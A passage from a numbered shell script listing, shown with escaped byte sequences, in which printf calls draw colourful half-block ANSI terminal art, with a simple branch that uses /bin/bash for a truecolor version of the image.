   191	              \e[48;5;65m\e[38;5;238mM-bM-^VM-^D\e[48;5;71m\e[38;5;234mM-bM-^VM-^D\e[48;5;71m       \e[48;5;235m\e[38;5;71mM-bM-^VM-^D\e[48;5;0m\e[38;5;71mM-bM-^VM-^D\e[48;5;232m\e[38;5;71mM-bM-^VM-^D\e[48;5;233m\e[38;5;238mM-bM-^VM-^D\e[48;5;65m\e[38;5;234mM-bM-^VM-^D\e[48;5;70m\e[38;5;232mM-bM-^VM-^D\e[48;5;77m\e[38;5;0mM-bM-^VM-^D\e[48;5;76m\e[38;5;232mM-bM-^VM-^D\e[48;5;76m\e[38;5;235mM-bM-^VM-^D\e[48;5;76m\e[38;5;237mM-bM-^VM-^D\e[48;5;76m\e[38;5;237mM-bM-^VM-^D\e[48;5;76m\e[38;5;65mM-bM-^VM-^D\e[48;5;76m\e[38;5;65mM-bM-^VM-^D\e[48;5;76m\e[38;5;22mM-bM-^VM-^D\e[48;5;76m\e[38;5;234mM-bM-^VM-^D\e[48;5;76m\e[38;5;232mM-bM-^VM-^D\e[48;5;76m\e[38;5;0mM-bM-^VM-^D\e[48;5;76m\e[38;5;0mM-bM-^VM-^D\e[48;5;71m\e[38;5;232mM-bM-^VM-^D\e[48;5;237m\e[38;5;236mM-bM-^VM-^D\e[48;5;233m\e[38;5;71mM-bM-^VM-^D\e[48;5;0m\e[38;5;71mM-bM-^VM-^D\e[48;5;234m\e[38;5;71mM-bM-^VM-^D\e[48;5;65m\e[38;5;71mM-bM-^VM-^D\e[48;5;71m       \e[38;5;65mM-bM-^VM-^D\e[48;5;71m\e[38;5;235mM-bM-^VM-^D\e[48;5;71m\e[38;5;235mM-bM-^VM-^D\e[48;5;71m\e[38;5;236mM-bM-^VM-^D\e[48;5;71m\e[38;5;236mM-bM-^VM-^D\e[48;5;71m\e[38;5;237mM-bM-^VM-^D\e[0m
   192	                \e[38;5;232mM-bM-^VM-^@\e[48;5;65m\e[38;5;236mM-bM-^VM-^D\e[48;5;71m\e[38;5;234mM-bM-^VM-^D\e[48;5;71m            \e[48;5;65m\e[38;5;71mM-bM-^VM-^D\e[48;5;237m\e[38;5;71mM-bM-^VM-^D\e[48;5;234m\e[38;5;71mM-bM-^VM-^D\e[48;5;233m\e[38;5;71mM-bM-^VM-^D\e[48;5;234m\e[38;5;71mM-bM-^VM-^D\e[48;5;237m\e[38;5;71mM-bM-^VM-^D\e[48;5;65m\e[38;5;71mM-bM-^VM-^D\e[48;5;65m\e[38;5;71mM-bM-^VM-^D\e[48;5;71m         \e[38;5;237mM-bM-^VM-^D\e[48;5;71m\e[38;5;233mM-bM-^VM-^D\e[48;5;65m\e[38;5;8mM-bM-^VM-^D\e[0m\e[38;5;234mM-bM-^VM-^@\e[38;5;234mM-bM-^VM-^@\e[38;5;239mM-bM-^VM-^@\e[0m
   193	                   \e[38;5;234mM-bM-^VM-^@\e[38;5;236mM-bM-^VM-^@\e[48;5;71m\e[38;5;235mM-bM-^VM-^D\e[48;5;71m\e[38;5;234mM-bM-^VM-^D\e[48;5;71m\e[38;5;238mM-bM-^VM-^D\e[48;5;71m\e[38;5;65mM-bM-^VM-^D\e[48;5;71m                \e[38;5;65mM-bM-^VM-^D\e[48;5;71m\e[38;5;236mM-bM-^VM-^D\e[48;5;71m\e[38;5;233mM-bM-^VM-^D\e[48;5;71m\e[38;5;235mM-bM-^VM-^D\e[48;5;65m\e[38;5;243mM-bM-^VM-^D\e[0m\e[38;5;233mM-bM-^VM-^@\e[38;5;235mM-bM-^VM-^@\e[0m
   194	                        \e[38;5;242mM-bM-^VM-^@\e[38;5;233mM-bM-^VM-^@\e[38;5;232mM-bM-^VM-^@\e[38;5;234mM-bM-^VM-^@\e[38;5;236mM-bM-^VM-^@\e[48;5;65m\e[38;5;236mM-bM-^VM-^D\e[48;5;65m\e[38;5;233mM-bM-^VM-^D\e[48;5;71m\e[38;5;233mM-bM-^VM-^D\e[48;5;71m\e[38;5;233mM-bM-^VM-^D\e[48;5;71m\e[38;5;232mM-bM-^VM-^D\e[48;5;71m\e[38;5;232mM-bM-^VM-^D\e[48;5;71m\e[38;5;233mM-bM-^VM-^D\e[48;5;65m\e[38;5;237mM-bM-^VM-^D\e[48;5;237m\e[38;5;8mM-bM-^VM-^D\e[0m\e[38;5;234mM-bM-^VM-^@\e[38;5;232mM-bM-^VM-^@\e[38;5;232mM-bM-^VM-^@\e[38;5;59mM-bM-^VM-^@\e[0m
   195	'";
   196	  else
   197	    if [ -f "/bin/bash" ]; then
   198	    /bin/bash -c "printf '
   199	                            \e[38;2;26;43;21mM-bM-^VM-^D\e[38;2;58;91;50mM-bM-^VM-^D\e[48;2;116;117;116m\e[38;2;68;119;56mM-bM-^VM-^D\e[48;2;98;98;98m\e[38;2;86;143;70mM-bM-^VM-^D\e[48;2;98;98;98m\e[38;2;100;153;87mM-bM-^VM-^D\e[48;2;63;65;63m\e[38;2;102;164;86mM-bM-^VM-^D\e[48;2;46;49;44m\e[38;2;98;168;79mM-bM-^VM-^D\e[48;2;43;45;43m\e[38;2;91;155;75mM-bM-^VM-^D\e[48;2;61;62;61m\e[38;2;78;137;63mM-bM-^VM-^D\e[48;2;102;101;102m\e[38;2;64;112;52mM-bM-^VM-^D\e[0m\e[38;2;38;67;32mM-bM-^VM-^D\e[38;2;20;35;16mM-bM-^VM-^D\e[38;2;10;20;8mM-bM-^VM-^D\e[38;2;15;21;13mM-bM-^VM-^D\e[0m
   200	                    \e[38;2;49;80;41mM-bM-^VM-^D\e[38;2;73;133;59mM-bM-^VM-^D\e[48;2;20;21;20m\e[38;2;91;163;72mM-bM-^VM-^D\e[48;2;14;27;12m\e[38;2;96;174;76mM-bM-^VM-^D\e[48;2;51;92;41m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;86;155;68m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;96;173;77m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;178;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;97;175;76m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;93;168;74m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;99;163;83m\e[38;2;97;177;77mM-bM-^VM-^D\e[48;2;99;151;86m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;35;57;29m\e[38;2;98;176;78mM-bM-^VM-^D\e[48;2;19;21;19m\e[38;2;94;169;75mM-bM-^VM-^D\e[0m\e[38;2;70;125;56mM-bM-^VM-^D\e[0m
   201	             \e[38;2;42;65;36mM-bM-^VM-^D\e[38;2;62;106;52mM-bM-^VM-^D\e[48;2;94;95;94m\e[38;2;86;152;70mM-bM-^VM-^D\e[48;2;57;72;53m\e[38;2;96;174;77mM-bM-^VM-^D\e[48;2;57;96;47m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;78;136;62m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;95;167;76m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;98;176;77mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;91;165;72mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;76;137;60mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;54;97;42mM-bM-^VM-^D\e[48;2;99;179;79m\e[38;2;39;71;30mM-bM-^VM-^D\e[48;2;100;181;79m\e[38;2;35;60;30mM-bM-^VM-^D\e[48;2;101;181;81m\e[38;2;42;66;37mM-bM-^VM-^D\e[48;2;100;177;80m\e[38;2;52;73;45mM-bM-^VM-^D\e[48;2;95;175;76m\e[38;2;47;75;40mM-bM-^VM-^D\e[48;2;94;178;73m\e[38;2;41;75;33mM-bM-^VM-^D\e[48;2;98;179;78m\e[38;2;42;73;34mM-bM-^VM-^D\e[48;2;99;180;79m\e[38;2;40;70;33mM-bM-^VM-^D\e[48;2;99;179;78m\e[38;2;44;75;36mM-bM-^VM-^D\e[48;2;97;177;77m\e[38;2;55;93;46mM-bM-^VM-^D\e[48;2;97;176;77m\e[38;2;65;113;52mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;79;141;63mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;93;166;75mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;99;177;79mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;97;177;78mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;97;177;78mM-bM-^VM-^D\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;94;170;75m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;71;128;56m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;34;56;28m\e[38;2;97;175;77mM-bM-^VM-^D\e[48;2;64;66;64m\e[38;2;78;140;62mM-bM-^VM-^D\e[0m
   202	         \e[48;2;66;112;54m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;80;133;66m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;95;162;76m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;96;171;76m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;98;176;78mM-bM-^VM-^D\e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;97;176;77mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;96;174;76mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;74;130;59mM-bM-^VM-^D\e[48;2;98;176;78m\e[38;2;32;49;27mM-bM-^VM-^D\e[48;2;95;166;76m\e[38;2;18;29;15mM-bM-^VM-^D\e[48;2;73;126;59m\e[38;2;65;113;53mM-bM-^VM-^D\e[48;2;40;62;34m\e[38;2;107;209;83mM-bM-^VM-^D\e[48;2;23;43;19m\e[38;2;77;220;42mM-bM-^VM-^D\e[48;2;32;72;22m\e[38;2;72;218;36mM-bM-^VM-^D\e[48;2;55;155;30m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;71;203;38m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;79;212;46m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;81;216;48m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;82;220;48m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;79;221;44m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;76;219;40m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;76;218;40m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;75;213;41m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;79;203;48m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;76;175;52m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;52;127;33m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;29;75;18m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;19;45;12m\e[38;2;73;218;36mM-bM-^VM-^D\e[48;2;45;74;38m\e[38;2;65;196;33mM-bM-^VM-^D\e[48;2;76;127;62m\e[38;2;44;132;24mM-bM-^VM-^D\e[48;2;90;158;72m\e[38;2;16;45;10mM-bM-^VM-^D\e[48;2;97;175;77m\e[38;2;28;50;22mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;80;145;64mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;97;175;77mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;97;176;77mM-bM-^VM-^D\e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;98;176;78mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;98;177;77mM-bM-^VM-^D\e[48;2;97;173;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;69;114;56m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;30;38;28m\e[38;2;103;179;83mM-bM-^VM-^D\e[0m\e[38;2;99;149;87mM-bM-^VM-^D\e[0m
   203	         \e[48;2;98;177;78m\e[38;2;98;177;77mM-bM-^VM-^D\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;98;178;78mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;98;178;78mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;83;150;66mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;44;80;34mM-bM-^VM-^D\e[48;2;99;179;78m\e[38;2;33;49;28mM-bM-^VM-^D\e[48;2;87;159;69m\e[38;2;68;97;61mM-bM-^VM-^D\e[48;2;46;84;37m\e[38;2;87;165;68mM-bM-^VM-^D\e[48;2;25;37;21m\e[38;2;83;208;52mM-bM-^VM-^D\e[48;2;59;131;42m\e[38;2;73;219;37mM-bM-^VM-^D\e[48;2;74;199;43m\e[38;2;74;223;37mM-bM-^VM-^D\e[48;2;72;213;38m\e[38;2;67;204;35mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;55;171;29mM-bM-^VM-^D\e[48;2;72;218;36m\e[38;2;59;136;22mM-bM-^VM-^D\e[48;2;72;218;36m\e[38;2;103;132;15mM-bM-^VM-^D\e[48;2;73;219;37m\e[38;2;149;133;9mM-bM-^VM-^D\e[48;2;72;220;37m\e[38;2;168;130;7mM-bM-^VM-^D\e[48;2;73;220;37m\e[38;2;167;118;5mM-bM-^VM-^D\e[48;2;72;218;37m\e[38;2;106;78;4mM-bM-^VM-^D\e[48;2;69;210;36m\e[38;2;93;69;4mM-bM-^VM-^D\e[48;2;66;199;34m\e[38;2;173;117;4mM-bM-^VM-^D\e[48;2;63;192;32m\e[38;2;177;119;4mM-bM-^VM-^D\e[48;2;62;186;32m\e[38;2;173;116;4mM-bM-^VM-^D\e[48;2;61;186;31m\e[38;2;176;115;4mM-bM-^VM-^D\e[48;2;63;191;32m\e[38;2;174;115;4mM-bM-^VM-^D\e[48;2;67;202;34m\e[38;2;170;113;4mM-bM-^VM-^D\e[48;2;70;213;36m\e[38;2;180;118;3mM-bM-^VM-^D\e[48;2;72;219;37m\e[38;2;175;117;4mM-bM-^VM-^D\e[48;2;73;220;37m\e[38;2;154;120;7mM-bM-^VM-^D\e[48;2;73;220;37m\e[38;2;80;94;11mM-bM-^VM-^D\e[48;2;73;219;37m\e[38;2;48;93;15mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;41;112;19mM-bM-^VM-^D\e[48;2;72;215;36m\e[38;2;45;144;25mM-bM-^VM-^D\e[48;2;64;192;32m\e[38;2;63;191;32mM-bM-^VM-^D\e[48;2;32;99;16m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;21;41;16m\e[38;2;72;210;38mM-bM-^VM-^D\e[48;2;38;66;30m\e[38;2;67;177;41mM-bM-^VM-^D\e[48;2;79;141;63m\e[38;2;53;123;36mM-bM-^VM-^D\e[48;2;98;178;78m\e[38;2;32;57;25mM-bM-^VM-^D\e[48;2;98;179;77m\e[38;2;25;46;20mM-bM-^VM-^D\e[48;2;97;177;77m\e[38;2;56;100;46mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;93;165;75mM-bM-^VM-^D\e[48;2;97;176;77m\e[38;2;100;181;80mM-bM-^VM-^D\e[48;2;98;177;77m\e[38;2;97;176;76mM-bM-^VM-^D\e[48;2;97;176;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;99;174;79m\e[38;2;98;177;78mM-bM-^VM-^D\e[0m
   204	         \e[48;2;98;178;78m\e[38;2;46;76;38mM-bM-^VM-^D\e[48;2;100;178;80m\e[38;2;50;69;45mM-bM-^VM-^D\e[48;2;99;176;80m\e[38;2;35;46;33mM-bM-^VM-^D\e[48;2;82;148;65m\e[38;2;7;9;6mM-bM-^VM-^D\e[48;2;64;117;50m\e[38;2;35;54;30mM-bM-^VM-^D\e[48;2;42;77;34m\e[38;2;52;107;39mM-bM-^VM-^D\e[48;2;26;46;21m\e[38;2;80;194;52mM-bM-^VM-^D\e[48;2;34;71;26m\e[38;2;73;216;38mM-bM-^VM-^D\e[48;2;54;133;35m\e[38;2;67;192;32mM-bM-^VM-^D\e[48;2;81;199;52m\e[38;2;81;158;23mM-bM-^VM-^D\e[48;2;80;218;46m\e[38;2;100;110;11mM-bM-^VM-^D\e[48;2;66;199;33m\e[38;2;152;98;2mM-bM-^VM-^D\e[48;2;60;157;26m\e[38;2;220;129;1mM-bM-^VM-^D\e[48;2;80;128;18m\e[38;2;251;145;0mM-bM-^VM-^D\e[48;2;120;110;9m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;154;106;4m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;181;114;2m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;230;134;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;251;144;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;254;146;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;163;94;0m\e[38;2;134;78;0mM-bM-^VM-^D\e[48;2;2;1;0m\e[38;2;58;33;0mM-bM-^VM-^D\e[48;2;13;7;0m\e[38;2;133;76;0mM-bM-^VM-^D\e[48;2;64;38;0m\e[38;2;12;7;0mM-bM-^VM-^D\e[48;2;250;144;0m\e[38;2;234;135;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;249;146;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;239;143;2m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;223;131;1m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;192;120;2m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;130;96;5m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;82;88;9m\e[38;2;255;148;0mM-bM-^VM-^D\e[48;2;62;104;15m\e[38;2;247;147;1mM-bM-^VM-^D\e[48;2;49;132;22m\e[38;2;212;134;3mM-bM-^VM-^D\e[48;2;57;165;32m\e[38;2;144;95;3mM-bM-^VM-^D\e[48;2;53;117;38m\e[38;2;74;61;8mM-bM-^VM-^D\e[48;2;50;97;39m\e[38;2;47;60;21mM-bM-^VM-^D\e[48;2;35;56;29m\e[38;2;47;81;33mM-bM-^VM-^D\e[48;2;17;22;15m\e[38;2;20;34;19mM-bM-^VM-^D\e[48;2;31;50;26m\e[38;2;48;73;42mM-bM-^VM-^D\e[48;2;55;90;47m\e[38;2;37;56;33mM-bM-^VM-^D\e[48;2;78;132;64m\e[38;2;21;31;18mM-bM-^VM-^D\e[48;2;95;167;78m\e[38;2;18;26;16mM-bM-^VM-^D\e[0m
   205	         \e[48;2;48;74;43m\e[38;2;51;78;45mM-bM-^VM-^D\e[48;2;48;74;43m\e[38;2;50;76;44mM-bM-^VM-^D\e[48;2;46;71;42m\e[38;2;12;17;11mM-bM-^VM-^D\e[48;2;32;54;28m\e[38;2;45;93;35mM-bM-^VM-^D\e[48;2;58;112;46m\e[38;2;26;45;17mM-bM-^VM-^D\e[48;2;55;130;37m\e[38;2;121;83;5mM-bM-^VM-^D\e[48;2;57;133;27m\e[38;2;232;138;0mM-bM-^VM-^D\e[48;2;101;96;8m\e[38;2;253;146;0mM-bM-^VM-^D\e[48;2;200;118;1m\e[38;2;254;147;0mM-bM-^VM-^D\e[48;2;248;144;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;254;147;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;173;100;0m\e[38;2;210;122;0mM-bM-^VM-^D\e[48;2;172;100;0m\e[38;2;76;44;0mM-bM-^VM-^D\e[48;2;214;123;0m\e[38;2;153;88;0mM-bM-^VM-^D\e[48;2;36;21;0m\e[38;2;162;94;0mM-bM-^VM-^D\e[48;2;201;116;0m\e[38;2;20;12;0mM-bM-^VM-^D\e[48;2;254;147;0m\e[38;2;238;137;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;254;147;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;241;143;1m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;213;125;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;117;73;3m\e[38;2;252;147;1mM-bM-^VM-^D\e[48;2;25;36;21m\e[38;2;94;69;18mM-bM-^VM-^D\e[48;2;50;77;44m\e[38;2;39;59;33mM-bM-^VM-^D\e[48;2;51;78;45m \e[48;2;51;78;44m\e[38;2;51;78;45mM-bM-^VM-^D\e[0m
   206	         \e[48;2;51;78;45m\e[38;2;50;76;44mM-bM-^VM-^D\e[48;2;40;58;34m\e[38;2;43;36;13mM-bM-^VM-^D\e[48;2;38;37;6m\e[38;2;240;143;2mM-bM-^VM-^D\e[48;2;149;95;6m\e[38;2;254;147;0mM-bM-^VM-^D\e[48;2;226;134;1m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;253;146;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m\e[38;2;243;140;0mM-bM-^VM-^D\e[48;2;116;67;0m\e[38;2;90;52;0mM-bM-^VM-^D\e[48;2;237;137;0m\e[38;2;254;147;0mM-bM-^VM-^D\e[48;2;248;143;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;250;144;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;45;25;0m\e[38;2;191;110;0mM-bM-^VM-^D\e[48;2;64;36;0m\e[38;2;32;18;0mM-bM-^VM-^D\e[48;2;245;141;0m\e[38;2;152;87;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;254;147;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;230;140;6m\e[38;2;254;147;0mM-bM-^VM-^D\e[48;2;25;21;7m\e[38;2;143;86;2mM-bM-^VM-^D\e[48;2;48;74;42m\e[38;2;39;60;34mM-bM-^VM-^D\e[48;2;51;78;45m \e[0m
   207	         \e[48;2;41;63;37m\e[38;2;40;47;23mM-bM-^VM-^D\e[48;2;119;70;1m\e[38;2;230;135;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;180;104;0m\e[38;2;120;68;0mM-bM-^VM-^D\e[48;2;135;78;0m\e[38;2;158;91;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;250;145;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m\e[38;2;254;146;0mM-bM-^VM-^D\e[48;2;252;145;0m\e[38;2;209;120;0mM-bM-^VM-^D\e[48;2;54;31;0m\e[38;2;61;35;0mM-bM-^VM-^D\e[48;2;94;54;0m\e[38;2;159;91;0mM-bM-^VM-^D\e[48;2;254;146;0m\e[38;2;244;140;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;240;144;1m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;36;40;18m\e[38;2;70;49;6mM-bM-^VM-^D\e[48;2;50;78;45m\e[38;2;45;69;40mM-bM-^VM-^D\e[0m
   208	         \e[48;2;65;48;9m\e[38;2;98;64;6mM-bM-^VM-^D\e[48;2;255;149;0m\e[38;2;255;147;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;254;147;0m\e[38;2;254;146;0mM-bM-^VM-^D\e[48;2;225;130;0m\e[38;2;175;100;0mM-bM-^VM-^D\e[48;2;210;120;0m\e[38;2;253;146;0mM-bM-^VM-^D\e[48;2;209;121;0m\e[38;2;254;147;0mM-bM-^VM-^D\e[48;2;86;49;0m\e[38;2;189;109;0mM-bM-^VM-^D\e[48;2;254;146;0m\e[38;2;142;81;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;102;59;0mM-bM-^VM-^D\e[48;2;199;115;0m\e[38;2;69;40;0mM-bM-^VM-^D\e[48;2;244;141;0m\e[38;2;238;138;0mM-bM-^VM-^D\e[48;2;253;146;0m\e[38;2;184;105;0mM-bM-^VM-^D\e[48;2;200;115;0m\e[38;2;231;134;0mM-bM-^VM-^D\e[48;2;253;147;0m\e[38;2;254;146;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;149;98;7m\e[38;2;215;132;5mM-bM-^VM-^D\e[48;2;35;54;32m\e[38;2;31;42;22mM-bM-^VM-^D\e[0m
   209	         \e[48;2;133;82;3m\e[38;2;153;89;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m\e[38;2;255;146;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;255;146;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m\e[38;2;254;148;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;248;147;0mM-bM-^VM-^D\e[48;2;254;147;0m\e[38;2;242;142;0mM-bM-^VM-^D\e[48;2;204;116;0m\e[38;2;224;131;0mM-bM-^VM-^D\e[48;2;200;115;0m\e[38;2;205;124;1mM-bM-^VM-^D\e[48;2;199;115;0m\e[38;2;175;109;2mM-bM-^VM-^D\e[48;2;172;100;0m\e[38;2;157;102;2mM-bM-^VM-^D\e[48;2;168;97;0m\e[38;2;172;114;3mM-bM-^VM-^D\e[48;2;206;119;0m\e[38;2;156;115;5mM-bM-^VM-^D\e[48;2;215;125;0m\e[38;2;138;111;7mM-bM-^VM-^D\e[48;2;180;105;0m\e[38;2;121;105;8mM-bM-^VM-^D\e[48;2;233;136;0m\e[38;2;120;109;8mM-bM-^VM-^D\e[48;2;254;148;0m\e[38;2;116;111;9mM-bM-^VM-^D\e[48;2;254;148;0m\e[38;2;112;111;10mM-bM-^VM-^D\e[48;2;255;148;0m\e[38;2;130;121;10mM-bM-^VM-^D\e[48;2;254;148;0m\e[38;2;103;105;10mM-bM-^VM-^D\e[48;2;254;148;0m\e[38;2;99;99;9mM-bM-^VM-^D\e[48;2;254;148;